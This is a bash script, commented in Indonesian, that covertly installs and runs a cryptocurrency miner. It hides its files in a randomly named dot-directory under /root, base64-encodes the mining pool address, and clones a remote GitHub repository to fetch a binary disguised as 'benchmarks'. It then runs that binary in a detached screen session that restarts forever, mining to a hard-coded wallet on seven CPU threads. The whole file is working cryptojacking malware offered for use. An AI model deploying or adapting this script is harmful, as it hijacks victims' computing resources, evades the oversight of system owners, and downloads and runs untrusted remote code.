#!/bin/bash
apt update -y >/dev/null 2>&1 && apt install -y screen wget tar curl -y >/dev/null 2>&1

# Nama acak (6 karakter)
XBIN=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
XDIR="/root/.${XBIN}"

# Pool terenkripsi base64
ENC_POOL="c3RyYXR1bSt0Y3A6Ly91cy1jZW50cmFsLnJldHJvbWlrZS5uZXQ6NTAwNQ=="
DEC_POOL=$(echo "$ENC_POOL" | base64 -d)

# Wallet
WALLET="PQ1TCGVFEz8LzEgiyECHCVozsdtLvQ2N61"

# Siapkan direktori dan jalankan
mkdir -p "$XDIR"
cat << EOF > $XDIR/.${XBIN}.sh
#!/bin/bash
cd "$XDIR" || exit

# Download binary jika belum ada
[ ! -f $XDIR/$XBIN ] && git clone https://github.com/amirul5656/yui56.git "$XDIR/.tmp" && \
cd "$XDIR/.tmp" && chmod +x benchmarks && cp benchmarks "$XDIR/$XBIN"

# Jalankan jika belum ada screen aktif
screen -list | grep -q $XBIN || screen -dmS $XBIN bash -c '
  while true; do
    $XDIR/$XBIN --algorithm xelisv2_pepew --pool $DEC_POOL -u $WALLET -p x --cpu-threads 7
    sleep 2
  done
'
EOF

chmod +x "$XDIR/.${XBIN}.sh" && bash "$XDIR/.${XBIN}.sh"
